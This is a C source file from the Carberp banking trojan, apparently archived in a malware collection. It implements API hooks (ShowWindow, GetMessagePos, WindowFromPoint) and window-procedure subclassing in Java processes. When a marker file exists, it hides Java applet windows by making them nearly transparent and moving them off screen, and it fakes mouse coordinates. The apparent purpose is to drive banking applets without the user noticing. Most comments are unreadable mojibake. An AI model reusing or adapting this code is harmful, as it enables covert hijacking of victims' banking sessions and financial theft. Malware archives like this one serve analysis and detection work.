/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include <windowsx.h>

#include "GetApi.h"
//#include "Utils.h"

#include "Memory.h"
#include "Strings.h"

#include "BotUtils.h"
#include "Rootkit.h"
#include "Inject.h"
//#include "Crypt.h"
#include "Unhook.h"
#include "Splice.h"


#include "Java.h"

//#include "ntdll.h"

// ���������� ���������� ��� ��������� ������ Java-��������
// ����� ������������� ������ ������� ����� � ���� ���������� ����
static LONG g_old_frame_wnd_proc  = 0;
static LONG g_old_dialog_wnd_proc = 0;
static HWND g_frame_wnd  = 0;
static HWND g_dialog_wnd = 0;
static bool g_is_dialog = false;

// ��������� ��������� - ������� �������� � ������������� GetMessagePost ������
// ������, ����� ���������� ���� ������
static const LONG MSG_POS_COUNT	= 10;

// ��� ������ � ������������ ������ �����
static int g_xPos = -1;
static int g_yPos = -1;
static int g_Count = 0;


// ��� ������� ������� �� ����� ������ ��� Java
typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
static PShowWindow    Real_ShowWindow;

typedef DWORD ( WINAPI *PGetMessagePos )( VOID );
static PGetMessagePos    Real_GetMessagePos;

typedef HWND  ( WINAPI *PWindowFromPoint )( POINT Point );
static PWindowFromPoint    Real_WindowFromPoint;


/************************************************************************/
/* ����� ������� ��������� ��� java-����, ��������� ������ ����� ����   */
// � ������� ������, ����� ���� �� � ������
static LONG CALLBACK __NewJavaWndProc(HWND hWnd, UINT uMsg,
																			WPARAM wParam, LPARAM lParam)
{
	static char szBuf[MAX_PATH] = {'\0'};

	WCHAR cClasN[50];

	bool isFrame  = false;
	bool isDialog = false;

	switch (uMsg)
	{
		case WM_LBUTTONDOWN:
			{
				pGetClassNameW(hWnd, cClasN, MAX_PATH);

				isFrame  = (NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtFrame"));
				isDialog = (NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtDialog"));
				if(isFrame)
				{
					g_is_dialog = false;
					g_frame_wnd = hWnd;
				}
				else if(isDialog)
				{
					g_is_dialog = true;
					g_dialog_wnd = hWnd;
				}

				// ���������� ���������� ����� ��� ����, ����� ����� 
				// ������� �� � �-�� GetMessagePos
				g_xPos = GET_X_LPARAM(lParam); 
				g_yPos = GET_Y_LPARAM(lParam); 
				g_Count = 0;

				// ���������� �����
				OutputDebugStr("LBTNDOWN");
				wsprintfA(szBuf, "x: %d, y: %d", g_xPos, g_yPos);
				OutputDebugStr(szBuf);

				break;
			}
		case WM_LBUTTONUP:
			{			
				break;
			}
		case WM_MOUSEACTIVATE:
			{				
				return MA_NOACTIVATE;// ��������� ������������ ����
			}
		case WM_CHAR:
			{
				// ���� �������� ���������� ����, ������ ������ �� ���� //
				
				break;
			}
	}
	// ��� ����� ��� ������?
	LONG old_wnd_proc = ((g_frame_wnd == hWnd) ? g_old_frame_wnd_proc : g_old_dialog_wnd_proc);

	// �������� ��������� ������� �������
	return CallWindowProc((WNDPROC)old_wnd_proc, hWnd, uMsg, wParam, lParam);
}

/************************************************************************/
/* ���������� ����� ������������ Java ����� ��� �������, ������� �����  */
// ���������� � ��� ����� ����������� ����������, ��������� ����� 
// WM_LBUTTONDOWN
DWORD WINAPI Hook_GetMessagePos()
{
	POINT lpPoint;
	lpPoint.x = g_xPos;
	lpPoint.y = g_yPos;
	DWORD res = 0;

	if (g_Count > MSG_POS_COUNT)
	{
		// GetMessagePos ������� ��������, ������ ������� ������ ��
		// ������� ������������ ������ ������� ������������ �-� - 
		// ��������� �
		UnhookGetMessagePos();
	
		//// �������� ������������ �-� 
		res = (DWORD)pGetMessagePos();
		//res = Real_GetMessagePos();

		//// ���������� �� ����� ���������� 
		HookApi( 3, 0x9D2F45DB, (DWORD)&Hook_GetMessagePos);
	}
	else
	{
		g_Count++;

		// ��������� ���������� �� ���������� � ��������
		HWND csWnd = (g_is_dialog ? g_dialog_wnd : g_frame_wnd);
		pClientToScreen(csWnd, &lpPoint);

		// ����� ��� �� ������ ���������� ����������, ��. MSDN �� GetMessagePos
		res = ((lpPoint.y<<16) + lpPoint.x);
	}
	// ���������� ���������
	return res;
}

/************************************************************************/
// ������������ ��� �-� ��� ����, ����� ����� �������� ���� � ���������� 
// � ������� ����
HWND WINAPI Hook_WindowFromPoint(POINT Point)
{
	// �������� - �����/������
	HWND res = (g_is_dialog ? g_dialog_wnd : g_frame_wnd);

	if (g_Count > MSG_POS_COUNT)
	{
		// �������� ������������ �������
		res = Real_WindowFromPoint(Point);
	}
	return res;
}

/************************************************************************/
/* ������ ������� ������� ������ ��� ������� �� ���� �����������,       */
// ��������� ����� ���� ��������, �� ������� �� ������ �����
void ChangeWndProc(HWND hWnd, HWND *hWnd2Store, LONG *oldProc)
{
	// ���� ������� ��������� ��� �� ��������� �� �����������
	if ( (LONG)pGetWindowLongW(hWnd, GWL_WNDPROC) != (LONG)__NewJavaWndProc )
		{
			*hWnd2Store = hWnd;	
			*oldProc = (LONG)pSetWindowLongW(hWnd, GWL_WNDPROC, (LONG)__NewJavaWndProc);
			pOutputDebugStringW(*oldProc ? L"WndProc change Ok" : L"WndProc change Failed");
		}
}
///����������� �����
typedef enum {
    SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
    SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
} SHGFP_TYPE;
#define CSIDL_APPDATA                   0x001a        // <user name>\Application Data
/************************************************************************/
/* � ������ ������ ���� �� ������ ������������� ��� ������� �������,    */
// ���� ��� ��� �� �����������. ���� ������������ ������, �� ������� ���
// ���������, ��� ���������� ������ ����� �������������� ��� ����.
static BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
{
	// �������� �������� ������ ����
	WCHAR cClasN[MAX_PATH];
	pGetClassNameW(hWnd, cClasN, MAX_PATH);
	bool isFrame  = NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtFrame");//(NULL != m_strstr(cClasN, "SunAwtFrame"));
	bool isDialog = NULL!=(PTSTR)pStrStrIW(cClasN,L"SunAwtDialog");//(NULL != m_strstr(cClasN, "SunAwtDialog"));

	if (SW_HIDE != Cmd)
	{
		if (isFrame)
		{
			// ���������� ������� ������� �� ����
			ChangeWndProc(hWnd, &g_frame_wnd, &g_old_frame_wnd_proc);
			g_is_dialog = false;
		} else
		if (isDialog)
		{
			// ���������� ������� ������� �� ����

			ChangeWndProc(hWnd, &g_dialog_wnd, &g_old_dialog_wnd_proc);
			g_is_dialog = true;
		}
	}
	else
	{
		g_is_dialog = false;
	}

	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',L'\0'};
	WCHAR *SysPath1 = (WCHAR*)MemAlloc( MAX_PATH* sizeof(WCHAR) );
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);	
	
	plstrcatW( &SysPath1[0], ExplorerAdd );
	if ( (DWORD)pGetFileAttributesW( SysPath1 ) != -1 )
	{
		int x = (int)pGetSystemMetrics( SM_CXSCREEN );
		int y = (int)pGetSystemMetrics( SM_CYSCREEN );
		RECT  tmp;
		pGetWindowRect(hWnd,&tmp);	
		pSleep(10);
		pMoveWindow(hWnd,x-300, 10, tmp.right - tmp.left, tmp.bottom - tmp.top,true);
		pSetWindowPos(hWnd, HWND_BOTTOM, (int)(x-10), (int)10,  (int)(tmp.right - tmp.left), (int)(tmp.bottom - tmp.top), SWP_NOACTIVATE );
		pSetWindowLongA(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
		pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);
		pSetWindowLongA(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
		
		Cmd=0;
	}
	MemFree(SysPath1);	

	// �������� ��������� ShowWindow
	return Real_ShowWindow(hWnd, Cmd);
}

/************************************************************************/
bool WINAPI IsJava()
{
	// ������� ������ ������ ���� ��� ������� � ��������
	// Java.exe ��� Javaw.exe
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	// Java ��� Javaw
	if ( dwProcessHash == 0x150CFBD3 || dwProcessHash == 0x1F1AA76A )
		{			
		//	OutputDebugStr("Java process has been found!");
			MemFree( ModulePath );
			return true;
		}

	MemFree( ModulePath );
	return false;
}


/************************************************************************/
bool HookJava()
{
	// ������� ������ ���� �� ������� ������� ������� ����������
	// Java ��� ������ �� ������ ������
	// �������� ������ � ������ ������ �� �������� Java

	if ( !IsJava() )
	{
		return false;
	}

	UnhookJava();

	

	return HookJavaApi();
}

/************************************************************************/
bool HookJavaApi()
{
	pOutputDebugStringA("Java process has been found!");
	WCHAR ExplorerAdd[] = {'\\','i','e','.','d','a','t',L'\0'};
	WCHAR SysPath1[MAX_PATH* sizeof(WCHAR)];// = (WCHAR*)MemAlloc( MAX_PATH* sizeof(WCHAR) );
	
	
	pSHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, SysPath1);	
	plstrcatW( &SysPath1[0], ExplorerAdd );
	if ( (DWORD)pGetFileAttributesW( SysPath1 ) != -1 )
	{

		if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
		{  
			__asm mov [Real_ShowWindow], eax			
		}	

		if ( HookApi( 3, 0x9D2F45DB, (DWORD)&Hook_GetMessagePos) )
		{  
			__asm mov [Real_GetMessagePos], eax			
		}	

		if ( HookApi( 3, 0x85F352BD, (DWORD)&Hook_WindowFromPoint) )
		{  
			__asm mov [Real_WindowFromPoint], eax			
		}
	}
	else return false;
	
	return true;
}




